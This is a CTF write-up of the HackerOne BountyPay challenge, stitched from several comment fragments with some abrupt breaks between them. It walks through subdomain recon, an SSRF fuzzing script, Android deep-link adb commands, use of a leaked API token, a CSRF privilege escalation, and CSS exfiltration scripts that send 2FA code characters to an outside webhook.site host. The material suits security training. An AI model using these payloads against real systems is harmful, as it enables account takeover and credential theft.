I draw an image with the paths I took in order to solve the challenge.\n\n![Paths](./graph.png)\n\nThank you very much for this CTF, since I'm studying reverse engineering android latelly the android part of this challenge were really helpful.  \n\n# Reconnaissance\nThe first tweet about the CTF\n\n![Paths](./h1ctfannounce.png)\n\nAnd an interesting retweet.\n\n![Paths](./bountypayt1.png)\n\nLead me to the BountyPay HQ twitter, the most recent tweet was about a new employee called Sandra, then I head to \"followed by\" page and Sandra Alisson was there. Clicking on Sandra's profile we could see that she took a picture of her badge with a barcode.\n\n![Paths](./bountypayt2.png)\n\nSeeing this great art, the announcement tweet and Sandra's badge, I went right to @h1-ctf program page to try this challenge.  \n\nAfter reading the rules and description I saw that the scope were a wildcard subdomain `*.bountypay.h1ctf.com`, so let's begin the recon!  \nRunning [amass](https://github.com/OWASP/Amass) resulted in some interesting subdomains.  \n```bash\n[key@chain h1-ctf]λ amass enum --passive -d bountypay.h1ctf.com\nbountypay.h1ctf.com\n# Querying messages\napi.bountypay.h1ctf.com\nstaff.bountypay.h1ctf.com\n253awww.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\nowasp_needs_upgrade_failed_to_send_a_nonce.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\n2b-www.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\n20-www.bountypay.h1ctf.com\n3awww.bountypay.h1ctf.com\n\nOWASP Amass v3.5.4                                https://github.com/OWASP/Amass\n--------------------------------------------------------------------------------\n11 names discovered - cert: 2, api: 1, dns: 1, scrape: 7\n```\nNow that we have those 4 subdomains let's see how they look like on browser, but after this let's run some small fuzzing with [ffuf](https://github.com/ffuf/ffuf/) to see if we find a hidden page or directory.\n\napp.bountypay.h1ctf.com\n\n![Software subdomain](./appsub.png)\n\nOn this one we can see only a login page, I thought about login bypass and tried some combinations of Sandra with her leaked badge, nothing worked.\n\nstaff.bountypay.h1ctf.com\n\n![Software subdomain](./staffsub.png)\n\nThis page seems interesting, we have a login page and a `template` parameter, so I tried some well known names in this parameter, like `admin`, `user`, `staff`, and I could find that `admin` exists and returned `No Access to this resource`. With this in mind I tried some parameter polution to see if I could load admin page but with the backend thinking that I'm loading the login page. Then I discovered that I could load two templates with one request by the payload `?template[]=admin\u0026template[]=login`.\n\napi.bountypay.h1ctf.com\n\n![Software subdomain](./apisub.png)\n\nThis has just a link to `/redirect?url=https://www.google.com/search?q=REST+API`, so I tried running some open redirects payloads but everything was leading me to `URL NOT FOUND IN WHITELIST`, then I realized that I was wasting time with this and went to another subdomain.\n\nsoftware.bountypay.h1ctf.com\n\n![Software subdomain](./softwaresub.png)\n\nWe can't access this page at all, then I went back to api and tried a redirect to software subdomain but got 401 again.\n\nWith nothing working I was starting to feel sad and even tried some stego tools on Sandra's picture, then I remembered that I was running ffuf and looked into the terminal, ffuf said to me that `.git` was `403 forbidden` on `app.bountypay.h1ctf.com` and then I realized this could be the first step.\n","automated_response":false,"created_at":"2020-06-11T05:02:47.523Z","updated_at":"2020-06-11T05:02:47.523Z","actor":{"username":"0xxl","cleared":false,"url":"/0xxl","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8259502,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\n# First log in\n\nRunning [git-dumper](https://github.com/arthaud/git-dumper) I was able to get some interesting files from the server, reading the config file from .git directory, it leaked a [github repository](https://github.com/bounty-pay-code/request-logger.git) with only one file `logger.php`.\n\n```php\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND);\n```\n\nNice!!

So with the payload in hands and the transactions request I saw that I was completely wrong, but also the type juggling was true. I also tried IDORing the pay endpoint, that I've found on `app.js` file, but could not find anything.\n\n![Not an idor](./noidor.png)\n\nBy this request I was able to see that I could craft a url changing the `account_id` parameter on cookie. Firstly we will ignore the last part `/statements?month=04\u0026year=2020` with a #, this will change this part into a fragment and it worked as expected.\n\n![Still not an idor](./noidor2.png)\n\nOk, let's try to see some paths on api, like api/staff (found by background fuzzing). None of the paths worked. Some hours later I thought, \"Now we can just test if `/redirect` will work as SSRF, if it follows redirect then we can see `software.bountypay.h1ctf.com`\", executing this thought with the payload `../../../../redirect?url=https://software.bountypay.h1ctf.com/#` I were able to see the login page on the response `data` attribute.\n\n![Software login page](./softwarelogin.png)\n\nSince it were night and I were tired, I wrote a quick script to fuzz this subdomain and put it to run with a dictionary and went to sleep.\n\n```python\nimport requests\nimport base64\nimport json\nsession = requests.Session()\n\nAPP_ENDPOINT_NOSCHEMA = \"app.bountypay.h1ctf.com\"\nAPP_ENDPOINT = f\"https://{APP_ENDPOINT_NOSCHEMA}\"\nSOFTWARE_ENDPOINT = \"https://software.bountypay.h1ctf.com\"\n\nwith open(\"storage.dict\") as f:\n    path = f.readline()[:-1]\n    token_base = {}\n    while path:\n        token_base[\"account_id\"] = f\"../../../../../../redirect?url={SOFTWARE_ENDPOINT}/{path}#\"\n        token_base[\"hash\"] = 0\n        token = base64.b64encode(json.dumps(token_base).encode()).decode()\n        session.cookies.set(\"token\", token, path='/', domain=APP_ENDPOINT_NOSCHEMA)\n        r = session.get(f\"{APP_ENDPOINT}/statements?month=02\u0026year=2020\")\n        if \"Not Found\" not in r.json()['data']:\n            print(f\"Found! {path}\\n\\n{r.json()['data']}\")\n        path = f.readline()[:-1]\n```\n\nWaking up the next morning I got a really cool finding.\n\n```html\nFound! uploads\n\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eIndex of /uploads/\u003c/title\u003e\u003c/head\u003e\n\u003cbody bgcolor=\"white\"\u003e\n\u003ch1\u003eIndex of /uploads/\u003c/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\"../\"\u003e../\u003c/a\u003e\n\u003ca href=\"/uploads/BountyPay.apk\"\u003eBountyPay.apk\u003c/a\u003e                                        20-Apr-2020 11:26              4043701\n\u003c/pre\u003e\u003chr\u003e\u003c/body\u003e\n\u003c/html\u003e\n```\n\nThen I tried to fetch it with my browser and downloaded the file.\n","automated_response":false,"created_at":"2020-06-11T05:03:29.732Z","updated_at":"2020-06-11T05:03:29.732Z","actor":{"username":"0xxl","cleared":false,"url":"/0xxl","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8259504,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\n# Android magic\nFirst thing I do when I see an .apk in a CTF is to run [apktool](https://ibotpeaches.github.io/Apktool/) and [dex2jar](https://github.com/pxb1988/dex2jar). Second thing is to see what is going on at `AndroidManifest.xml`, reading this file I were able to recognize that there was four activities, and three important ones `PartOneActivity`, `PartTwoActivity`, `PartThreeActivity`. So let's install this apk on the emulator. After installing and opening the app, we face this screen.\n\n![Android MainActivity](./android1.png)\n\nHitting submit lead us to PartOneActivity, so let's see the source code provided by dex2jar with [jd-gui](http://java-decompiler.github.io/).\n\n## Part one\n```java\nprotected void onCreate(Bundle paramBundle) {\n    super.onCreate(paramBundle);\n    setContentView(2131427358);\n    setSupportActionBar((Toolbar)findViewById(2131231012));\n    this.mFirebaseAnalytics = FirebaseAnalytics.getInstance((Context)this);\n    SharedPreferences sharedPreferences = getSharedPreferences(\"user_created\", 0);\n    ((FloatingActionButton)findViewById(2131230845)).setOnClickListener(new View.OnClickListener() {\n          public void onClick(View param1View) {\n            PartOneActivity partOneActivity;\n            if (PartOneActivity.this.click == 0) {\n              Snackbar.make(param1View, \"Deep links.\", 0).setAction(\"Action\", null).show();\n              partOneActivity = PartOneActivity.this;\n              partOneActivity.click++;\n              return;\n            } \n            if (PartOneActivity.this.click == 1) {\n              Snackbar.make((View)partOneActivity, \"Params.\", 0).setAction(\"Action\", null).show();\n              PartOneActivity.this.click = 0;\n            } \n          }\n        });\n    if (!sharedPreferences.contains(\"USERNAME\")) {\n      Toast.makeText(getApplicationContext(), \"Please create a CTF username :)\", 0).show();\n      startActivity(new Intent((Context)this, MainActivity.class));\n    } \n    if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n      String str = getIntent().getData().getQueryParameter(\"start\");\n      if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n        str = sharedPreferences.getString(\"USERNAME\", \"\");\n        SharedPreferences.Editor editor = sharedPreferences.edit();\n        String str1 = sharedPreferences.getString(\"TWITTERHANDLE\", \"\");\n        editor.putString(\"PARTONE\", \"COMPLETE\").apply();\n        logFlagFound(str, str1);\n        startActivity(new Intent((Context)this, PartTwoActivity.class));\n      } \n    } \n  }\n```\n\n![Android PartOneActivity](./androidp1.png)\n\nHitting the BountyPay button two times show us two hints:\n1. Deep Links.\n2. Params.\n\nAfter searching for deep links I could find the [documentation](https://developer.android.com/training/app-links/deep-linking) and [how to call it](https://stackoverflow.com/questions/28802115/i-am-trying-to-test-android-deep-link-urls-through-adb-to-launch-my-app), so, by the source code and manifest file, we need a deep link `one://part` with a `start` parameter equals to `PartTwoActivity` and it will go to part two. Then our payload is:\n\n```bash\nadb shell am start -a android.intent.action.VIEW -d one://part/?start=PartTwoActivity bounty.pay\n```\n\n## Part two\n```java\nprotected void onCreate(Bundle paramBundle) {\n    //...\n    if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n      Uri uri = getIntent().getData();\n      String str1 = uri.getQueryParameter(\"two\");\n      String str2 = uri.getQueryParameter(\"switch\");\n      if (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n        editText.setVisibility(0);\n        button.setVisibility(0);\n        textView.setVisibility(0);\n      } \n    } \n  }\n  \n  public void submitInfo(View paramView) {\n    final String post = ((EditText)findViewById(2131230834)).getText().toString();\n    this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {\n          //...\n          public void onDataChange(DataSnapshot param1DataSnapshot) {\n            String str1 = (String)param1DataSnapshot.getValue();\n            SharedPreferences sharedPreferences = PartTwoActivity.this.getSharedPreferences(\"user_created\", 0);\n            SharedPreferences.Editor editor = sharedPreferences.edit();\n            String str2 = post;\n            StringBuilder stringBuilder = new StringBuilder();\n            stringBuilder.append(\"X-\");\n            stringBuilder.append(str1);\n            if (str2.equals(stringBuilder.toString())) {\n              str1 = sharedPreferences.getString(\"USERNAME\", \"\");\n              String str = sharedPreferences.getString(\"TWITTERHANDLE\", \"\");\n              PartTwoActivity.this.logFlagFound(str1, str);\n              editor.putString(\"PARTTWO\", \"COMPLETE\").apply();\n              PartTwoActivity.this.correctHeader();\n              return;\n            } \n            Toast.makeText((Context)PartTwoActivity.this, \"Try again! :D\", 0).show();\n          }\n        });\n  }\n```\n\nThe hints for part two are:\n1.

Then we need to find out what is this hash (459a6f79ad9b13cbcb5f692d2cc7a94d), since my computer is not that good I first try to crack the hash on a [website](https://crackstation.net/)\n\n![Crackstation](./crackstation.png)\n\nOk, now we know that the header is `X-Token`.\n\n## Part three\n```java\nprotected void onCreate(Bundle paramBundle) {\n    //...\n    if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n      Uri uri = getIntent().getData();\n      final String firstParam = uri.getQueryParameter(\"three\");\n      final String secondParam = uri.getQueryParameter(\"switch\");\n      final String thirdParam = uri.getQueryParameter(\"header\");\n      byte[] arrayOfByte2 = Base64.decode(str1, 0);\n      byte[] arrayOfByte1 = Base64.decode(str2, 0);\n      final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);\n      final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);\n      this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n            public void onCancelled(DatabaseError param1DatabaseError) {\n              Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n            }\n            \n            public void onDataChange(DataSnapshot param1DataSnapshot) {\n              String str = (String)param1DataSnapshot.getValue();\n              if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n                String str1 = thirdParam;\n                if (str1 != null) {\n                  StringBuilder stringBuilder = new StringBuilder();\n                  stringBuilder.append(\"X-\");\n                  stringBuilder.append(str);\n                  if (str1.equals(stringBuilder.toString())) {\n                    editText.setVisibility(0);\n                    button.setVisibility(0);\n                    PartThreeActivity.this.thread.start();\n                  } \n                } \n              } \n            }\n          });\n    } \n  }\n  \npublic String performPostCall(String paramString) {\n    SharedPreferences sharedPreferences = getSharedPreferences(\"user_created\", 0);\n    String str1 = sharedPreferences.getString(\"HOST\", \"\");\n    String str2 = sharedPreferences.getString(\"TOKEN\", \"\");\n    Log.d(\"HOST IS: \", str1);\n    Log.d(\"TOKEN IS: \", str2);\n    try {\n      HttpURLConnection httpURLConnection = (HttpURLConnection)(new URL(str1)).openConnection();\n      httpURLConnection.setReadTimeout(10000);\n      httpURLConnection.setConnectTimeout(15000);\n      httpURLConnection.setRequestMethod(\"POST\");\n      httpURLConnection.setDoInput(true);\n      httpURLConnection.setDoOutput(true);\n      Uri.Builder builder = (new Uri.Builder()).appendQueryParameter(\"firstParam\", paramString);\n      StringBuilder stringBuilder = new StringBuilder();\n      stringBuilder.append(\"X-Token: \");\n      stringBuilder.append(paramString);\n      Log.d(\"HEADER VALUE AND HASH \", stringBuilder.toString());\n      paramString = builder.build().getEncodedQuery();\n      if (paramString != null) {\n        OutputStream outputStream = httpURLConnection.getOutputStream();\n        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, \"UTF-8\"));\n        bufferedWriter.write(paramString);\n        bufferedWriter.flush();\n        bufferedWriter.close();\n        outputStream.close();\n        httpURLConnection.connect();\n      } \n    } catch (IOException iOException) {\n      StringBuilder stringBuilder = new StringBuilder();\n      stringBuilder.append(\"Post request did not send: \");\n      stringBuilder.append(iOException);\n      Log.e(\"tag\", stringBuilder.toString());\n    } \n    return \"hi\";\n}\n```\n\nSeeing this piece of code we are aware that we need to pass an encoded `\"PartThreeActivity\"` to parameter `three`, an encoded `on` to param `switch` and the parameter `header` must be equal `X-Token`, so how should we encode it? It seems like Base64, because of variable `arrayOfByte1`. Then, if I'm not mistaken, the payload must be:\n\n```bash\nadb shell am start -a android.intent.action.VIEW -d \"three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026switch=b24=\\\u0026header=X-Token\" bounty.pay\n```\n\n![Android PartThreeActivity](./androidp3.png)\n\n\nIf we pay attention to the last function `performPostCall` we can see that the token is logged into `logcat`, then I just read logcat and leaked the token:\n\n```bash\n[key@chain h1-ctf]λ adb -d logcat | grep \"HOST IS:\"\n06-10 21:12:14.904  8707  9216 D HOST IS: : http://api.bountypay.h1ctf.com\n[key@chain h1-ctf]λ adb -d logcat | grep \"TOKEN IS:\"\n06-10 21:12:14.904  8707  9216 D TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1\n[key@chain h1-ctf]λ adb -d logcat | grep \"HEADER VALUE AND HASH\"\n06-10 21:12:14.905  8707  9216 D HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n","automated_response":false,"created_at":"2020-06-11T05:03:46.716Z","updated_at":"2020-06-11T05:03:46.716Z","actor":{"username":"0xxl","cleared":false,"url":"/0xxl","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8259506,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\n# Finally Sandra\nNow that we have a master hash and the header value we can go to the api endpoints mapped.\n```bash\n[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/ -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\"\n{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}\n[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\"\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\"\n[\"Endpoint Not Found\"]\n[key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\"\n[\"Endpoint Not Found\"]\n[key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff/ -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\"\n[\"Missing Parameter\"]\n[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff/ -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\" -d \"staff_id=STF:84DJKEIP38\"\n[\"Staff Member already has an account\"]\n```\n\nAfter these many tries I thought about my friend Sandra!\n\n```bash\n[key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\" -d \"staff_id=STF:8FJ3KFISL3\"\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\nNow we can login inside `staff.bountypay.h1ctf.com`!\n\n# CSRF + privilege escalation\n\nI really don't know why but I thought this `%3D` on the password were `=`, but after this failure I was able to log in as Sandra. Inside the staff painel we can see 3 tabs, one is just a welcome message, one is for tickets and other is to change avatar and name. Lookingg for the source code of the page, we can see it loads a `website.js` and has the url you are accessing in base64.\n\n![Staff page](./staff1.png)\n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}),\n$(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"),\n    $(this).addClass(\"active\"),\n    $(\"div.content\").addClass(\"hidden\"),\n    $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"),\n    !1\n}),\n$(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }),\n    $(\"#myModal\").modal(\"hide\")\n}),\ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"),\n\"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"),\n\"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"),\n\"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nWatching for `website.js` we notice that if we call the fragment `#tabx` will trigger click of any element with the class `tabx`, we notice the presence of /admin/report, that uses the base64 url defined before the file and an event listener that triggers when an element with class `upgradeToAdmin` is clicked, also we need an username input field on page to pass as parameter to `/admin/upgrade?username=[input of username]`. With this in mind I were able to get the best idea ever, just send to admin the base64 of `/admin/upgrade?username=sandra.alisson`, with this sent I waited like 10 minutes and nothing happened. Then I just clicked the report link on footer and said that /admin was disabled.  \n\nSo, we have an input at avatar tab, we could maybe change it to a xss payload would work, or maybe change avatar. Then I intercepted the request and changed both to `\u003cscript\u003ealert()\u003c/script\u003e` and went ahead to the ticket tab, but this happened.\n\n![Staff page2](./staff2.png)\n\nYes! Nothing cool happened, but I've noticed that `scriptalertscript` was a class name, then I killed it, it was so obvious that we needed to change it to `upgradeToAdmin` and use the report page with the parameter polution that we discovered at Recon stage. But we are missing something, we are missing the click trigger! So how can we trigger the click of avatar? On this piece of code we see that there is no tab4 element, then we can set the avatar to `upgradeToAdmin tab4` and it will trigger the click function if we pass `#tab4` as fragment of url.\n\n```html\n\u003cul class=\"nav nav-tabs\" style=\"margin-bottom:40px;margin-top:30px\"\u003e\n                \u003cli role=\"presentation\" class=\"tab tab1 active\" data-target=\"home\"\u003e\u003ca href=\"#\"\u003eHome\u003c/a\u003e\u003c/li\u003e\n                \u003cli role=\"presentation\" class=\"tab tab2\" data-target=\"tickets\"\u003e\u003ca href=\"#\"\u003eSupport Tickets\u003c/a\u003e\u003c/li\u003e\n                \u003cli role=\"presentation\" class=\"tab tab3\" data-target=\"profile\"\u003e\u003ca href=\"#\"\u003eProfile\u003c/a\u003e\u003c/li\u003e\n                                \u003cli role=\"presentation\"\u003e\u003ca href=\"/logout\"\u003eLogout\u003c/a\u003e\u003c/li\u003e\n            \u003c/ul\u003e\n```\n\nSo let's intercept the avatar change again and put the right class on it, after we set the url to `/?template[]=login\u0026template[]=ticket\u0026ticket_id=3582\u0026username=sandra.allison#tab4`, that will trigger the tab4 click, then upgradeToAdmin click, then it will look for the value of an input with name username, that will be `sandra.allison`, all this will happen because admin will read the ticket. Encoding this to base64 and sending to /admin/report should work fine. The final url will be `https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ==`. Going to this url and reloading the page will escate us to admin.\n\n![Marten is owned](./staff3.png)\n\nNow we have Marten's password!\n","automated_response":false,"created_at":"2020-06-11T05:04:00.557Z","updated_at":"2020-06-11T05:04:00.557Z","actor":{"username":"0xxl","cleared":false,"url":"/0xxl","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8259511,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\n# Last step, big step\n\nLet's log in with marten.mickos credentials at app.bountypay.h1ctf.com to see what is happening there.

Ok, now that we know it is a css exfiltration we need to try to find where to exfiltrate. First I declared an endpoint `/app.css` on beeceptor and runned the following python script to generate it.\n\n```python\nimport string\n\nfor i in string.printable:\n    print(\"input[name^='\"+i+\"'] { background-image: url(https://webhook.site/61451e7d-6fda-4e32-84f7-09a45e1d00ad/\"+i+\"); }\")\n```\nHere input\\[name^=i\\] will make the background-image request if there is an input with `i` starting letter. Then I repeated this completing characters until I get that the name I was exfiltrating was `code_x` with x from 1 to 7. Then I coded this small script to exfiltrate the characters and it was done!\n\n```python\nimport string\n\nfor x in range(7):\n    for i in string.ascii_lowercase + string.ascii_uppercase + string.digits:\n        print(\"input[name='code_\"+str(x+1)+\"'][value='\"+i+\"'] { background-image: url(https://webhook.site/61451e7d-6fda-4e32-84f7-09a45e1d00ad/2fa_\"+str(x+1)+\":\"+i+\");
